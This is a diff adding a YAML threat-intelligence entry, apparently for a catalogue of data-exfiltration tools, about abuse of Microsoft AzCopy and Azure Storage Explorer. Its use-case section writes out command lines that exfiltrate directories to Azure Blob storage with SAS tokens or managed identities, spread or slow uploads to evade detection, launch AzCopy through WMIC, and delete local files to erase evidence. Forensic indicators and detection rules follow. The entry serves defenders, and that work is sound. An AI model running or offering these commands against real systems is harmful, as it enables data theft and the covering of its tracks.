@@ -1,0 +1,137 @@
+Name: AzCopy
+Description: >
+  AzCopy is a Microsoft command-line tool used to transfer data to and from Azure Blob, File, and Table storage. 
+  It supports high-throughput transfers and is widely used by administrators and DevOps teams. 
+  Threat actors abuse AzCopy and Azure Storage Explorer to exfiltrate sensitive data via trusted cloud endpoints 
+  using SAS tokens or compromised credentials. Due to its flexibility, AzCopy supports stealthy uploads, 
+  selective exfiltration, and automation via service principals or managed identities.
+Category: cloud-based
+Platform:
+  - Windows
+  - Linux
+  - macOS
+Execution:
+  - cli
+  - gui
+Capabilities:
+  - cloud-sync
+  - encrypted-transfer
+  - selective-upload
+Stealth:
+  - background-execution
+  - encrypted-transfer
+  - credential-theft
+  - proxy-support
+Forensics:
+  BinaryLocations:
+    - C:\Program Files (x86)\Microsoft SDKs\Azure\AzCopy\AzCopy.exe
+    - C:\Program Files (x86)\Microsoft Azure Storage Explorer\StorageExplorer.exe
+    - USERPROFILE\.azcopy\azcopy_windows_amd64.exe
+    - /usr/local/bin/azcopy
+    - /usr/bin/azcopy
+    - /opt/azcopy/azcopy
+  FileNamePatterns:
+    - StorageExplorer\.exe
+    - azcopy_windows_amd64\.exe
+    - azcopy\.exe
+    - azcopy_v10\.exe
+  ConfigFiles:
+    - ~/.azcopy/
+  ScheduledTask:
+    - "Windows Task Scheduler"
+    - "cron job"
+  RegistryPersistence:
+    - "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\AzCopy"
+    - "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\AzCopy"
+  NetworkArtifacts:
+    - Outbound HTTPS to *.blob.core.windows.net
+    - High bytes_out over short time
+    - Repeated connections with SAS token in URL
+ThreatActors:
+  - ransomware
+  - apt
+Tags:
+  - commonly-used
+  - cloud-tool
+  - stealth
+  - lateral-movement
+UseCases:
+  - Title: Standard GUI Upload via Azure Storage Explorer
+    Description: >
+      Manual upload via Storage Explorer GUI. User selects files and uploads to Azure container.
+    Command: |
+      StorageExplorer.exe
+
+  - Title: CLI Exfiltration via AzCopy
+    Description: >
+      AzCopy used to upload directories to Azure Blob via SAS or AAD authentication.
+    Command: |
+      azcopy copy "C:\Data" "https://<account>.blob.core.windows.net/container?<sas>" --recursive --output-type=json
+
+  - Title: Distributed Upload from Multiple Hosts
+    Description: >
+      Multiple hosts simultaneously upload dataset fragments to same container to evade volume thresholds.
+    Command: |
+      azcopy copy "/data/part1" "https://<account>.blob.core.windows.net/container" --recursive
+
+  - Title: Slow Drip Exfiltration over Long Time Window
+    Description: >
+      Files uploaded gradually over 30–120 minutes to avoid detection.
+    Command: |
+      Scheduled azcopy copy per file with delay between each run.
+
+  - Title: Targeted List of Files
+    Description: >
+      Specific files exfiltrated using --list-of-files argument for stealth.
+    Command: |
+      azcopy copy --list-of-files="C:\files.txt" "https://<account>.blob.core.windows.net/container" --put-md5
+
+  - Title: SAS Token Abuse for Authentication
+    Description: >
+      Leaked or generated SAS token used in URL to upload data without login.
+    Command: |
+      azcopy copy "C:\Data" "https://<account>.blob.core.windows.net/container?<sas>"
+
+  - Title: Managed Identity / Service Principal Use
+    Description: >
+      VM/service principal uses Azure role to perform exfil without user interaction.
+    Command: |
+      azcopy login --identity
+      azcopy copy "/data" "https://<account>.blob.core.windows.net/container"
+
+  - Title: Storage Explorer GUI Triggers AzCopy
+    Description: >
+      GUI upload action automatically delegates to AzCopy CLI under the hood.
+    Command: |
+      StorageExplorer triggers AzCopy via job plan file
+
+  - Title: Post-Transfer File Deletion
+    Description: >
+      Cleanup script deletes local files after successful upload to erase evidence.
+    Command: |
+      azcopy copy ... ; if ($LASTEXITCODE -eq 0) { Remove-Item C:\file -Force }
+
+  - Title: Execution via WMIC or Other LOLBINs
+    Description: >
+      AzCopy launched via WMIC or other system interpreters to evade detection.
+    Command: |
+      wmic process call create "C:\Tools\azcopy.exe copy C:\file https://... --recursive"
+
+Detection:
+  - Type: Execution from Non-Standard Path
+    Description: Monitor for `azcopy.exe` or `StorageExplorer.exe` being launched from user-writable or non-standard directories such as `%APPDATA%`, `%TEMP%`, or network shares instead of the default installation path.
+
+  - Type: Suspicious Command-Line Arguments
+    Description: Detect AzCopy command lines containing flags such as `--list-of-files`, embedded SAS tokens, or managed identity authentication (`--identity`), which may indicate automated or stealthy exfiltration.
+
+  - Type: Forensic Correlation
+    Description: Correlate entries from Storage Explorer GUI logs with AzCopy job artifacts in `%USERPROFILE%\.azcopy\jobs\` or `~/.azcopy/jobs/` to identify GUI-triggered bulk data transfers.
+
+  - Type: Network Anomaly
+    Description: Alert on unusually large `bytes_out` volume or sustained uploads to `*.blob.core.windows.net` endpoints, particularly from unexpected hosts or non-administrative accounts.
+
+  - Type: Post-Exfiltration Cleanup
+    Description: Flag deletion of local source files immediately after successful AzCopy uploads, which may indicate attempts to remove forensic evidence following data exfiltration.
+
+LastModified: 2025-10-20
+
